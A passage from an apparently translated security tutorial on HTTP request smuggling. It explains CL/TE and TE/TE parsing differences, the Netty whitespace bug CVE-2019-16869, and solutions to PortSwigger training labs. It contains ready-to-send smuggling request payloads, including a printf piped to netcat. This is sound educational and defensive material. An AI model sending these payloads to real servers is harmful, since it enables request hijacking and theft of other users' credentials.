class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host:localhost\r\n</span></span><br><span class="line"><span class="hljs-attribute">Dummy</span>: Header\rZTransfer-Encoding: chunked\r\n</span><br><span class="line"><span class="hljs-attribute">Content-length</span>: 52\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="hljs-attribute">0\r\n</span></span><br><span class="line"><span class="hljs-attribute">\r\n</span></span><br><span class="line">GET /tmp HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host:localhost\r\n</span></span><br><span class="line"><span class="hljs-attribute">Dummy:Header\r\n</span></span><br></pre></td></tr></table></figure><p>The front server will think that <code>Dummy: Header\rZTransfer-Encoding: chunked\r\n</code> is a header. When use CL header parsing, it will consider this a complete request, and Node.js will consider<code>\rZ</code> as a Newline, according to the parsing rule that TE takes precedence over CL, it is considered that these are two requests, resulting in parsing differences.</p><h3 id="Size-Issue"><a href="#Size-Issue" class="headerlink" title="Size Issue"></a>Size Issue</h3><p>You can also use some coded block lengths to generate parsing differences</p><p>Such as:</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&apos;GET / HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host:localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Transfer-Encoding: chunked\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Dummy:Header\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;0000000000000000000000000000042\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;GET /tmp/ HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host:localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Transfer-Encoding: chunked\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;0\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line">| nc -q3 127.0.0.1 8080</span><br></pre></td></tr></table></figure><p>Some middleware will truncate the chunk length data when parsing the chunk size data. For example, here it is shown as only taking <code>0000000000000000000000000000042</code> as<code>00000000000000000</code>, so it will be considered that these are two requests. The first request&#x2019;s chunk size is 0. The second will request <code>/tmp</code>, which results in HTTP Smuggling.</p><h3 id="HTTP-Version"><a href="#HTTP-Version" class="headerlink" title="HTTP Version"></a>HTTP Version</h3><p>This is mainly due to the problem caused by HTTP/0.9. Let&#x2019;s take a look at several examples of HTTP:</p><p>HTTP v1.1</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br></pre></td></tr></table></figure><p>HTTP v1.0</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>HTTP v0.9</p><figure class="highlight routeros hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-builtin-name">GET</span> /foo\r\n</span><br></pre></td></tr></table></figure><p>And HTTP/0.9 request and response packets do not have headers. Such as:</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130142331.png" alt></p><p>Because HTTP/0.9 response packets do not have headers, they are particularly interesting to be used in HTTP Smuggling.</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130143300.png" alt></p><p>The meaning of this picture is that we use HTTP/0.9 for Smuggle when HTTP Smuggling. This is not the HTTP/0.9 standard format, but because some middleware no longer supports the standard format of directly parsing HTTP/0.9, but it is still possible to parse specified HTTP version. Then the following situations may exist:</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130143557.png" alt></p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130143626.png" alt></p><p>The above two figures show a rough attack flow. The 24-33664 bytes in chewy2.jpg have a complete HTTP response message. When Golang is processing HTTP/0.9, since we specified <code>Range: bytes=24-33664</code>, we can specify to obtain 24-33664 bytes of the response message, which is to obtain the HTTP message we stored in the picture, and then return it to Golang. Golang standardizes HTTP/0.9 and then remove headers. So the response looks like a new response.</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130153851.png" alt></p><p>When a normal user requests, if Apache reuses the TCP / IP link, it will return the HTTP message we constructed in the picture as a response packet to the user. This is also a very typical idea of HTTP Response Splitting. For details, please see the video demo <a href="https://www.youtube.com/watch?v=lY_Mf2Fv7kI" target="_blank" rel="noopener">HTTP Smuggling Examples 2016</a></p><h3 id="Has-a-CL-in-GET"><a href="#Has-a-CL-in-GET" class="headerlink" title="Has a CL in GET"></a>Has a CL in GET</h3><p>In this scenario, the body is used in the GET request, and the length of the body is indicated by Content-Length.</p><blockquote><pre><code>GET request is not the only one that get affected. I just use it as an example because it is typical. All HTTP requests that do not carry the request body may be affected by this.</code></pre></blockquote><p>According to <a href="https://tools.ietf.org/html/rfc7230#section-3.3.2" target="_blank" rel="noopener">RFC7230 Content-Length</a>:</p><blockquote><pre><code>For example, a Content-Length header field is normally sent in a POST request even when the value is 0 (indicating an empty payload body).  A user agent SHOULD NOT send a Content-Length header field when the request message does not contain a payload body and the method semantics do not anticipate such a body.</code></pre></blockquote><p>In the newest <a href="https://tools.ietf.org/html/rfc7231#section-4.3.1" target="_blank" rel="noopener">RFC7231 4.3.1 GET</a> also just mention a sentence&#xFF1A;</p><blockquote><pre><code>A payload within a GET request message has no defined semantics; sending a payload body on a GET request might cause some existing implementations to reject the request.</code></pre></blockquote><p>For requests that have a body field and indicate the length of the body with Content-Length, the RFC does not strictly explain how the server should handle it, so most middleware also loosely handles GET requests with a body, but this is also part of the situation Because these middlewares do not have a strict standard basis, parsing differences can also cause HTTP Smuggling attacks.</p><p>Here we give a simple and idealized example. The Front server allows body for GET requests, while the Backend server ignores GET requests with body.</p><p>When we send following requests&#xFF1A;</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 41\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /secret HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>When the Front server processes this request, it will forward the above request to the Backend server as a complete request, and the Backend service will treat this request as two requests when processing this server.</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 41\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /secret HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>In this way, we can successfully perform HTTP Smuggling. From this example, it is not difficult to see that if there is a HTTP Smuggling vulnerability in the scene, then the Content-Length data becomes extra important because it affects us. Whether the attack was successful and whether our HTTP request was successfully embedded in an HTTP request.</p><p>The calculation method here is similar to the previous.</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /secret HTTP/1.1\r\n--&gt;&quot;GET /secret HTTP/1.1&quot; 20 characters in total, plus 22 characters in CRLF</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n--&gt;&quot;Host: example.com&quot; 17 characters in total, plus 19 characters in CRLF</span><br></pre></td></tr></table></figure><p>22 + 19 = 41 Bytes.</p><h3 id="Two-Identical-Fields-CL"><a href="#Two-Identical-Fields-CL" class="headerlink" title="Two Identical Fields - CL"></a>Two Identical Fields - CL</h3><p>Here we take Content-Length as an example. According to <a href="https://tools.ietf.org/html/rfc7230#section-3.3.2" target="_blank" rel="noopener">RFC7230 section 3.3.2</a>:</p><blockquote><p>If a message is received that has multiple Content-Length header fields with field-values consisting of the same decimal value, or a single Content-Length header field with a field value containing a list of identical decimal values (e.g., &#x201C;Content-Length: 42, 42&#x201D;), indicating that duplicate Content-Length header fields have been generated or combined by an upstream message processor, then the recipient MUST either reject the message as invalid or replace the duplicated field-values with a single valid Content-Length field containing that decimal value prior to determining the message body length or forwarding the message.</p></blockquote><p>And in the <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3" target="_blank" rel="noopener">RFC 7230 section 3.3.3</a>  also mention this:</p><blockquote><p>If a message is received without Transfer-Encoding and with either multiple Content-Length header fields having differing field-values or a single Content-Length header field having an invalid value, then the message framing is invalid and the recipient MUST treat it as an unrecoverable error. If this is a request message, the server MUST respond with a 400 (Bad Request) status code and then close the connection.</p></blockquote><p>The RFC also has a relatively clear specification for this situation, but let&#x2019;s assume here a relatively simple example. We send the following request:</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /suzann.html HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 0\r\n</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 46\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /walter.html HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>Here, we assume that the Front server uses the second Content-Length as the parsing standard, discarding the first Content-Length field or doing nothing to the first or anything else, assuming it only processes the second Content-Length field; we are assuming that the Backend server uses the first Content-Length field as the parsing standard, and ignore the second.</p><p>This is equivalent to injecting another HTTP request into the HTTP request. If the entire scenario looks like ours, there is an HTTP Smuggling attack.</p><p>For example, if the server uses the first Content-Length as the parsing standard, two HTTP requests will appear in the parsing. If the second is used as the parsing standard, it will be considered that there is only one HTTP request.</p><h3 id="Optional-WhiteSpace"><a href="#Optional-WhiteSpace" class="headerlink" title="Optional WhiteSpace"></a>Optional WhiteSpace</h3><p>RFC7320 describes the header field like this:</p><blockquote><p>3.2.  Header Fields</p><p>Each header field consists of a case-insensitive field name followed<br>by a colon (&#x201C;:&#x201D;), optional leading whitespace, the field value, and<br>optional trailing whitespace.</p><figure class="highlight coq hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;      header-<span class="hljs-built_in">field</span>   = <span class="hljs-built_in">field</span>-name <span class="hljs-string">&quot;:&quot;</span> OWS <span class="hljs-built_in">field</span>-value OWS</span><br><span class="line">&gt; </span><br><span class="line">&gt;      <span class="hljs-built_in">field</span>-name     = token</span><br><span class="line">&gt;      <span class="hljs-built_in">field</span>-value    = *( <span class="hljs-built_in">field</span>-content / obs-<span class="hljs-built_in">fold</span> )</span><br><span class="line">&gt;      <span class="hljs-built_in">field</span>-content  = <span class="hljs-built_in">field</span>-vchar [ <span class="hljs-number">1</span>*( SP / HTAB ) <span class="hljs-built_in">field</span>-vchar ]</span><br><span class="line">&gt;      <span class="hljs-built_in">field</span>-vchar    = VCHAR / obs-text</span><br><span class="line">&gt; </span><br><span class="line">&gt;      obs-<span class="hljs-built_in">fold</span>       = CRLF <span class="hljs-number">1</span>*( SP / HTAB )</span><br><span class="line">&gt;                     ; obsolete line folding</span><br><span class="line">&gt;                     ; see <span class="hljs-keyword">Section</span> <span class="hljs-number">3.2</span><span class="hljs-number">.4</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>The field-name token labels the corresponding field-value as having<br>the semantics defined by that header field.  For example, the Date<br>header field is defined in Section 7.1.1.2 of [RFC7231] as containing<br>the origination timestamp for the message in which it appears.</p></blockquote><p>In particular, the first sentence indicates that the field should be immediately followed by <code>:</code> colon, then OWS (Optional WhiteSpace) optional space, then field value, and finally OWS optional space.</p><p>What&#x2019;s wrong with this? Obviously, if there is middleware that does not strictly follow the RFC standard for this implementation, HTTP Smuggling attacks will also occur.</p><p>A typical example is CVE-2019-16869. This CVE was discovered by OPPO Meridian Internet Security Lab. It is about HTTP Smuggling vulnerability in Netty middleware.</p><p>Prior to Netty 4.1.42.Final, the processing of Header headers was using <a href="https://github.com/netty/netty/blob/netty-4.1.41.Final/codec-http/src/main/ java / io / netty / handler / codec / http / HttpObjectDecoder.java" target="_blank" rel="noopener">splitHeader</a> method, where the key code is as follows:</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span> (nameEnd = nameStart; nameEnd &lt; length; nameEnd ++) {</span><br><span class="line">  <span class="hljs-keyword">char</span> ch = sb.charAt(nameEnd);</span><br><span class="line">  <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&apos;:&apos;</span> || Character.isWhitespace(ch)) {</span><br><span class="line">    <span class="hljs-keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>We don&#x2019;t need to know much about other codes. Here we can know that white space is treated the same as <code>:</code> colon, that is, if there is a space, the field name before <code>:</code> will be processed normally and will not be thrown error or other operations. This is inconsistent with the specifications of the RFC standard, and parsing differences will occur.</p><p>@ Bi3g0 built a clearer schematic of the vulnerability:</p><p><img src="https://user-images.githubusercontent.com/18691823/65211134-3e03cd00-dad0-11e9-94a5-b9f04ea18f38.png" alt></p><p>The example used here is to use ELB as the front server and Netty as the backend server. We send the following request:</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/getusers</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: www.backend.com</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 64</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /hacker HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: www.hacker.com</span><br><span class="line"><span class="hljs-attribute">hacker</span>: hacker</span><br></pre></td></tr></table></figure><p>ELB will ignore the Transfer-Encoding field, because there is a space between the colon and the colon. It does not comply with the RFC standard. It will use Content-Length as the parsing standard, so it will consider the above request as a complete request, and then throw it to the Backend server Netty. Netty will parse Transfer-Encoding first. Even if this field does not comply with the RFC standard, but because its implementation is not strict, it will split this request into two because it parses Transfer-Encoding first. </p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/getusers</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: www.backend.com</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 64</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></table></figure><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/hacker</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: www.hacker.com</span><br><span class="line"><span class="hljs-attribute">hacker</span>: hacker</span><br></pre></td></tr></table></figure><p>This result in HTTP smuggling.</p><p>Netty fixed this vulnerability in 4.1.42 Final: <a href="https://github.com/netty/netty/pull/9585" target="_blank" rel="noopener">Correctly handle whitespaces in HTTP header names as defined by RFC72 &#x2026;</a></p><p>When we send a header request with a space between field name and colon,  netty returns 400 correctly.</p><h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h3><p>In the next few attack methods, we can use some Labs provided by @portswigger to practice for us to deepen our understanding. <a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">Labs-HTTP request smuggling</a></p><p>Remember to cancel BurpSuite&#x2019;s automatic update Content-Length function before doing it.</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191013185654.jpg" alt></p><p>First let&#x2019;s look at the situation of CL-TE: <a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener">Lab: HTTP request smuggling, basic CL.TE vulnerability</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn&#x2019;t support chunked encoding. The front-end server rejects requests that aren&#x2019;t using the GET or POST method.</p><p>To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.</p></blockquote><p>According to the chall, we only need to let the Backend server receive the GPOST method, and the scenario clearly tells us that it is a CL-TE scenario.</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 6</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line"><span class="hljs-attribute">G</span></span><br></pre></td></tr></table></figure><p>We can send above requests twice.</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191013190441.jpg" alt></p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191013190452.jpg" alt></p><p>We can make the second method to construct the HTTP method of GPOST. For details, we can follow this flowchart to see:</p><figure class="highlight gherkin hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">User            Front           Backend</span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|</span><br><span class="line">|<span class="hljs-string">--A(1A+1/2B)--&gt;</span>|<span class="hljs-string">               </span>|<span class="hljs-string"> </span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">--A(1A+1/2B)--&gt;</span>|<span class="hljs-string"> </span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">&lt;-A(200)-------</span>|</span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line">|<span class="hljs-string">&lt;-A(200)-------</span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line">|<span class="hljs-string">--C-----------&gt;</span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">--C-----------&gt;</span>|<span class="hljs-string"> * ending B *</span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">&lt;--B(200)------</span>|</span><br><span class="line">|<span class="hljs-string">&lt;--B(200)------</span>|<span class="hljs-string">               </span>|</span><br></pre></td></tr></table></figure><ul><li>1A + 1/2B means request A + an incomplete query B</li><li>A(X) : means X query is hidden in body of query A</li><li>ending B: the 1st line of query C ends the incomplete header of query B. all others headers are added to the query. C disappears and mix C HTTP credentials with all previous B headers (cookie/bearer token/Host, etc.)</li></ul><p>The whole process is that when we send the above request and  the Front server preferentially processes with CL, it will think the following data which is 6 bytes is the body of request A.</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">0\r\n</span></span><br><span class="line"><span class="hljs-attribute">\r\n</span></span><br><span class="line"><span class="hljs-attribute">G</span></span><br></pre></td></tr></table></figure><p>This request A will be forwarded to the backend as a complete request, and when the backend server preferentially processes it with TE, it will consider follwing data is a complete request.</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 6</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></table></figure><p>But the alone letter &#x2018;G&#x2019;, it will be considered as an incomplete request. So a 1/2 B request will be generated, so it will wait for the arrival of other data at the Backend server buffer to make the 1/2 B spliced into a complete request. When we send the second request, POST will be concatenated behind G, so the HTTP Method will become the GPOST method, which is the echo that we see, the unrecognized HTTP Method GPOST.</p><h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h3><p>Next we look at the situation of TE-CL. Similarly, we use LAB experiments to deepen our understanding.&#xFF1A;<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noopener">Lab: HTTP request smuggling, basic TE.CL vulnerability</a></p><blockquote><p>This lab involves a front-end and back-end server, and the back-end server doesn&#x2019;t support chunked encoding. The front-end server rejects requests that aren&#x2019;t using the GET or POST method.</p><p>To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.</p></blockquote><p>According to the chall, what we want to achieve is still to let the backend receive the GPOST request, and the scenario clearly tells us that it is a TE-CL scenario.</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: acde1ffc1f047f9f8007186200ff00fe.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-length</span>: 4</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">12</span></span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></table></figure><p>It should be noted here that at the end you need to add two CRLFs to construct chunk data.</p><figure class="highlight taggerscript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br><span class="line"><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br></pre></td></tr></table></figure><p>Here we can send more than two HTTP request packets, and we can receive the response as shown below.</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191122230209.png" alt></p><p>The process flow is similar to CL-TE. When the Front server processes this request, it will be processed first according to TE. It will consider the above request as a whole and then forward it to the Backend server. When the Backend server processes it according to CL, it will consider that <code>12\r\n</code> is the body of the first request, the following is the second request, so it will respond to GPOST as an unrecognized HTTP Method.</p><h3 id="Two-Identical-Fields-TE"><a href="#Two-Identical-Fields-TE" class="headerlink" title="Two Identical Fields - TE"></a>Two Identical Fields - TE</h3><p>Here we look at the situation where TE exists. Similarly, we use LAB experiments to deepen our understanding:<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank" rel="noopener">Lab: HTTP request smuggling, obfuscating the TE header</a></p><blockquote><p>This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren&#x2019;t using the GET or POST method.</p><p>To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.</p></blockquote><p>According to the chall, what we want to achieve is still to let the backend receive the GPOST request, and the scenario clearly tells us that it is a TE-TE scenario. In fact, this scenario can also be considered as the processing of the same field. For example, when processing two TE fields, if the second TE field is taken as the parsing standard, and the second field value is abnormal or the parsing error, it may be ignored. TE field, and CL field for parsing. For example, in this LAB, we send the following request twice.</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: acfd1f201f5fb528809b582e004200a3.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQ</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="hljs-attribute">Content-length</span>: 4</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="hljs-attribute">Transfer-encoding</span>: nothing</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">12</span></span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></table></figure><p>Here is the same as the previous scenario, you need to add two CRLF at the end.</p><figure class="highlight taggerscript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br><span class="line"><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br></pre></td></tr></table></figure><p>We can get the response as shown below.</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191123002425.png" alt></p><p>We can see that two TE fields are used here, and the value of the second TE field is non-standard. Here, Front chooses to process the first TE first. The entire request is a normal request and will be forwarded to the Backend server. The backend server prioritizes the second TE. If the second TE value is abnormal, the CL field will be used for processing. This request will be split into two requests due to the CL field value 4.</p><p>The first request:</p><figure class="highlight http hljs"><table><tr><td 